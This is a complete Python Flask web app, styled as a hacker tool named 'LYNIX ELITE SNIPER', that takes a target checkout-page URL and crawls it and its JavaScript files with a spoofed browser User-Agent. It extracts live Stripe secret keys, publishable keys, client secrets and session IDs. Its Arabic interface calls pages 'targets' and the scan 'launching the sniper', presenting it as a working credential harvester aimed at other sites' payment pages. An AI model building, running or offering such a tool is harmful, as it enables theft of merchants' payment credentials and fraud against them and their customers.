from flask import Flask, request, jsonify, render_template_string
import requests
import re
import concurrent.futures
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

app = Flask(__name__)

# --- واجهة المستخدم الاحترافية (HTML) ---
HTML_INTERFACE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>LYNIX ELITE SNIPER | PRO</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .container { max-width: 800px; margin: auto; border: 1px solid #0f0; padding: 30px; box-shadow: 0 0 20px #0f0; }
        input { width: 80%; padding: 15px; background: #000; border: 1px solid #0f0; color: #fff; margin-bottom: 20px; }
        button { padding: 15px 30px; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
        button:hover { background: #fff; }
        #results { margin-top: 30px; text-align: right; border-top: 1px solid #333; padding-top: 20px; }
        .key-box { background: #111; padding: 10px; border-right: 5px solid #0f0; margin-bottom: 10px; word-break: break-all; }
    </style>
</head>
<body>
    <div class="container">
        <h1>[ LYNIX ELITE SNIPER V3 ]</h1>
        <p>أدخل رابط صفحة الدفع (Checkout) للقنص العميق:</p>
        <input type="text" id="targetUrl" placeholder="https://example.com/checkout">
        <br>
        <button onclick="startDeepScan()">إطلاق القناص 🚀</button>
        
        <div id="results">
            <p>بانتظار الأهداف...</p>
        </div>
    </div>

    <script>
        async function startDeepScan() {
            const url = document.getElementById('targetUrl').value;
            const resDiv = document.getElementById('results');
            resDiv.innerHTML = "⏳ جاري الزحف وتحليل الـ Network وملفات الـ JS...";
            
            try {
                const response = await fetch('/scan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ url: url })
                });
                const data = await response.json();
                
                if (data.status === "Success") {
                    let html = `<h3>✅ تم الفحص بنجاح (${data.scanned_assets_count} ملف)</h3>`;
                    for (const [type, keys] of Object.entries(data.keys_found)) {
                        html += `<h4>${type}:</h4>`;
                        keys.forEach(k => {
                            html += `<div class="key-box">${k}</div>`;
                        });
                    }
                    resDiv.innerHTML = html;
                } else {
                    resDiv.innerHTML = "❌ خطأ: " + data.message;
                }
            } catch (err) {
                resDiv.innerHTML = "❌ فشل الاتصال بالسيرفر";
            }
        }
    </script>
</body>
</html>
"""

# --- منطق البحث والقنص (Backend) ---
PATTERNS = {
    'Secret Key (SK)': r'sk_live_[a-zA-Z0-9]{24,}',
    'Publishable Key (PK)': r'pk_live_[a-zA-Z0-9]{24,}',
    'Client Secret (CS)': r'pi_[a-zA-Z0-9]{16,}_secret_[a-zA-Z0-9]{24,}',
    'Session ID (SS)': r'cs_live_[a-zA-Z0-9]{50,}'
}

def extract_keys(text):
    found = {}
    for label, pattern in PATTERNS.items():
        matches = re.findall(pattern, text)
        if matches: found[label] = list(set(matches))
    return found

@app.route('/')
def index():
    return render_template_string(HTML_INTERFACE)

@app.route('/scan', methods=['POST'])
def scan():
    base_url = request.json.get('url')
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0'}
    all_found_keys = {}
    
    try:
        res = requests.get(base_url, headers=headers, timeout=10)
        all_found_keys.update(extract_keys(res.text))
        
        # استخراج روابط الـ JS والزحف
        soup = BeautifulSoup(res.text, 'html.parser')
        assets = [urljoin(base_url, s.get('src')) for s in soup.find_all('script') if s.get('src')]
        
        def fetch_asset(link):
            try: return extract_keys(requests.get(link, headers=headers, timeout=5).text)
            except: return {}

        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
            for result in executor.map(fetch_asset, assets):
                for label, keys in result.items():
                    all_found_keys[label] = list(set(all_found_keys.get(label, []) + keys))

        return jsonify({"status": "Success", "scanned_assets_count": len(assets), "keys_found": all_found_keys})
    except Exception as e:
        return jsonify({"status": "Error", "message": str(e)})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
